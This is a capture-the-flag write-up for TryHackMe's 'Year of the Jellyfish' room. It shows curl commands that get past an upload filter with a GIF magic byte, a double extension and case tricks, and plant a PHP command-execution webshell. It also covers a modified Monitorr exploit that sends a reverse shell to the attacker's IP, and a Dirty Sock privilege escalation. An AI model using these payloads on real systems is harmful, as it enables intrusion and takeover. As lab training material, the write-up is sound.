<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>year of the jellyfish</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>year of the jellyfish</h1><br/><p><strong><h1>THM: Year of the Jellyfish</h1></strong></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong>Nmap</strong> </p><p></p><p><img src="images/48-1.png" alt="images/48-1.png" /></p><p></p><p><strong>By Looking at Subject Alternative Name:</strong> We added the following to host file.</p><p></p><p><strong>Hosts File Additions</strong></p><p><img src="images/48-2.png" alt="images/48-2.png" /></p><p></p><p><strong>Website Certificate</strong></p><p><img src="images/48-3.png" alt="images/48-3.png" /></p><p></p><p>Click on Advanced --→ Then Click on view certificate.</p><p>The page confirms our DNS additions.</p><p><img src="images/48-4.png" alt="images/48-4.png" /></p><p></p><p>After Accepting the certificate. We open the default website.</p><p></p><p><img src="images/48-5.png" alt="images/48-5.png" /></p><p></p><p><strong>Note:</strong> Port 80 also redirects to this HTTPS page.</p><p>Port 21 &amp; 22 did not have any CTF specific info.</p><p></p><p>Lets Enumerate Other Domains.</p><p></p><p><strong>Alternate Domain Enumeration:</strong></p><p></p><p><strong>https://dev.robyns-petshop.thm/</strong></p><p><img src="images/48-6.png" alt="images/48-6.png" /></p><p></p><p><strong>https://beta.robyns-petshop.thm/</strong></p><p><img src="images/48-7.png" alt="images/48-7.png" /></p><p></p><p><strong>https://monitorr.robyns-petshop.thm</strong></p><p><img src="images/48-8.png" alt="images/48-8.png" /></p><p></p><p>This Domain is Intresting. It uses a monitoring tool named <strong>Monitorr</strong>. The version is <strong>1.7.6m</strong></p><p>Lets check if if has any vulnerabilities.</p><p></p><p><img src="images/48-9.png" alt="images/48-9.png" /></p><p></p><p>Indeed this version is vulnerable.</p><p>The First Exploit of Searchsploit results did not work.</p><p>Lets download and check the second exploit.</p><p></p><p><strong>searchsploit -m 48980.py</strong></p><p></p><p><strong>Exploit Analysis</strong></p><p><img src="images/48-10.png" alt="images/48-10.png" /></p><p></p><p>This is the complete exploit. It uses an upload method to upload a Magic GIF file which has PHP code in it. This will execute a reverse shell to our mentioned IP &amp; Port.</p><p>I checked the upload URL and indeed its ready to accept an <strong>Image</strong>.</p><p><img src="images/48-11.png" alt="images/48-11.png" /></p><p></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>Lets run the exploit.</p><p><strong>python 48980.py https://monitorr.robyns-petshop.thm/ 10.11.72.31 7777</strong></p><p><img src="images/48-12.png" alt="images/48-12.png" /></p><p></p><p>We get certificate verify error. As this python script doesn&#39;t handles SSL certificates.</p><p>We make the following changes.</p><p></p><p>import requests</p><p>import os</p><p>import sys<strong></strong></p><p><strong></strong></p><p><strong>requests.packages.urllib3.disable_warnings()</strong></p><p></p><p>AND</p><p></p><p>&lt;SNIP&gt;</p><p>    requests.post(url, headers=headers, data=data, <strong>verify=False</strong>)</p><p>&lt;SNIP&gt;</p><p>    requests.get(url, headers=headers, <strong>verify=False</strong>)</p><p>&lt;SNIP&gt;</p><p></p><p></p><p>We run the <strong>exploit</strong> again.</p><p><img src="images/48-13.png" alt="images/48-13.png" /></p><p>It seemed like it worked. But we then check the upload folder as per the script.</p><p></p><p><strong>/assets/data/usrimg/</strong></p><p><img src="images/48-14.png" alt="images/48-14.png" /></p><p>As we can see, it didn&#39;t work.</p><p></p><p><strong>Note:</strong> I checked the browser for cookies and indeed found a cookie.</p><p><img src="images/48-15.png" alt="images/48-15.png" /></p><p></p><p>From Here we can go <strong>2 Ways</strong>.</p><p></p><p><strong>1) We add the cookie in the exploit and run it.</strong></p><p><strong>2) We will manually exploit usinng CURL</strong></p><p></p><p><strong><span style="text-decoration:underline;">Method-1</span></strong></p><p></p><p>&lt;SNIP&gt;</p><p>    requests.post(url, headers=headers, data=data, verify=False, <strong>cookie={&quot;isHuman&quot;:&quot;1&quot;}</strong>)</p><p>&lt;SNIP&gt;</p><p>    requests.get(url, headers=headers, verify=False, <strong>cookie={&quot;isHuman&quot;:&quot;1&quot;}</strong>)</p><p>&lt;SNIP&gt;</p><p></p><p></p><p><strong>Note:</strong> There are filters in place for the upload mechanism. This can be found and tackled individually in <strong>Method-2</strong>.</p><p>For now, I will use double extention with case variation for my upload file.</p><p>Thus we will change the following in the python script.</p><p></p><p>First and Second occurence respectively:</p><p><strong>she_ll.php ----→ she_ll.gif.pHp</strong></p><p><strong>she_ll.php ----→ she_ll.gif.php</strong></p><p></p><p></p><p>Start Netcat Listener and Run the Exploit.</p><p></p><p></p><p><img src="images/48-16.png" alt="images/48-16.png" /></p><p></p><p><img src="images/48-17.png" alt="images/48-17.png" /></p><p>As we can see, our file has been uploaded and its in the name of <strong>she_ll.gif.php</strong> as per the second instance of the file in the script. This is because the <strong>*.gif.pHp</strong> becomes <strong>*.gif.php</strong> once its saved in the server.</p><p></p><p><strong>Note:</strong>I found that the reverse shell will not work if we use any port above 1000. But its working absolutely fine with port 443</p><p></p><p></p><p><img src="images/48-18.png" alt="images/48-18.png" /></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Method-2</span></strong></p><p></p><p><strong>Using CURL</strong></p><p>This method will explain why the changes were made in <strong>Method-1</strong>.</p><p></p><p>I will use Curl to see what protections are in place. First we can try and upload a file using the same method in the exploit but direct from Curl:</p><p>I get a temporary png file(<strong>testfile.png</strong>).</p><p></p><p><strong>curl -k -F &quot;fileToUpload=@./testfile.png&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php</strong></p><p></p><p><img src="images/48-19.png" alt="images/48-19.png" /></p><p></p><p>Above -k tells Curl to ignore the certificate check. We can see my attempt to upload a picture failed. Let’s try adding the cookie we found before:</p><p></p><p><strong>curl -k -F &quot;fileToUpload=@./testfile.png&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php -H &quot;Cookie: isHuman=1&quot;</strong></p><p></p><p><img src="images/48-20.png" alt="images/48-20.png" /></p><p></p><p>As we can see, the file was sucessfully uploaded.</p><p>Now let&#39;s try a php file, like the exploit does:</p><p></p><p><strong>echo -e $&#39;hello from cybex&#39; &gt; test.php</strong></p><p><strong>curl -k -F &quot;fileToUpload=@./test.php&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php -H &quot;Cookie: isHuman=1&quot;</strong></p><p></p><p><img src="images/48-21.png" alt="images/48-21.png" /></p><p></p><p>However, the file didn&#39;t upload because its blocking the php file.</p><p>So we can see there is a check to see if the uploaded file is an<strong> image</strong>, we can try a <strong>GIF89a magic byte</strong> and <strong>double extension</strong> to get around this:</p><p></p><p><strong>echo -e $&#39;\x47\x49\x46\x38\x39\x61\nhello from cybex&#39; &gt; test2.gif.php</strong></p><p><strong>curl -k -F &quot;fileToUpload=@./test2.gif.php&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php -H &quot;Cookie: isHuman=1&quot;</strong></p><p></p><p><img src="images/48-22.png" alt="images/48-22.png" /></p><p></p><p>Still no good, let’s see if the check is case sensitive:</p><p></p><p><strong>mv test2.gif.php test2.gif.pHp</strong></p><p><strong>curl -k -F &quot;fileToUpload=@./test2.gif.pHp&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php -H &quot;Cookie: isHuman=1&quot;</strong></p><p><strong>curl -k https://monitorr.robyns-petshop.thm/assets/data/usrimg/test2.gif.php</strong></p><p></p><p><img src="images/48-23.png" alt="images/48-23.png" /></p><p></p><p>Finally, it worked and my text is output. Now we can add PHP code and execute it.</p><p></p><p><strong>echo -e $&#39;\x47\x49\x46\x38\x39\x61\n&lt;?php echo system(&quot;whoami&quot;);&#39; &gt; test3.gif.PHP</strong></p><p><strong>curl -k -F &quot;fileToUpload=@./test3.gif.PHP&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php -H &quot;Cookie: isHuman=1&quot;</strong></p><p><strong>curl -k https://monitorr.robyns-petshop.thm/assets/data/usrimg/test3.gif.php</strong></p><p></p><p><img src="images/48-24.png" alt="images/48-24.png" /></p><p></p><p>Thus, we have RCE. (Note: I tested, we can add PHP code to have a reverse shell and it does work)</p><p>However, the full command couldn&#39;t be given with <strong>echo -e</strong> command. Thus we need a text editor to change the above PHP code to reverse shell. So that the <strong>magic byte</strong> <strong>(GIF89a)</strong> remains fixed.</p><p></p><p><img src="images/48-25.png" alt="images/48-25.png" /></p><p></p><p><strong>curl -k -F &quot;fileToUpload=@./test4.gif.PHP&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php -H &quot;Cookie: isHuman=1&quot;</strong></p><p></p><p><strong>curl -k https://monitorr.robyns-petshop.thm/assets/data/usrimg/test4.gif.php</strong></p><p><strong>or </strong></p><p><strong>Run from website.</strong></p><p></p><p><img src="images/48-26.png" alt="images/48-26.png" /></p><p></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>Lets check SUID set executibles.</p><p><img src="images/48-27.png" alt="images/48-27.png" /></p><p></p><p></p><p>The above file is highlighted even in Linux Exploit Suggester. It uses <strong>Dirty-Sock</strong> Exploit</p><p>We can use searchsploit to find <strong>snapd</strong></p><p></p><p><img src="images/48-28.png" alt="images/48-28.png" /></p><p></p><p>Out of the two exploits, the 2nd one worked. I created a local HTTP server and served the exploit. Then downloaded it to the target machine.</p><p><img src="images/48-29.png" alt="images/48-29.png" /></p><p></p><p></p><p>Now, we run the python script.</p><p><img src="images/48-30.png" alt="images/48-30.png" /></p><p></p><p>As now we can see that the exploit ran successfully. Now, to get root access, we need to switch to the above user with the given credentials. Then use sudo as this user has sudo rights.</p><p></p><p><strong>Note:</strong> We can also SSH using the above credentails.</p><p></p><p><img src="images/48-31.png" alt="images/48-31.png" /></p><p></p><p><strong>userflag:</strong></p><p><img src="images/48-32.png" alt="images/48-32.png" /></p><p></p><p><strong>Rootflag:</strong></p><p><img src="images/48-33.png" alt="images/48-33.png" /></p><p></p><p>Thanks!!</p></div>
</body>
</html>
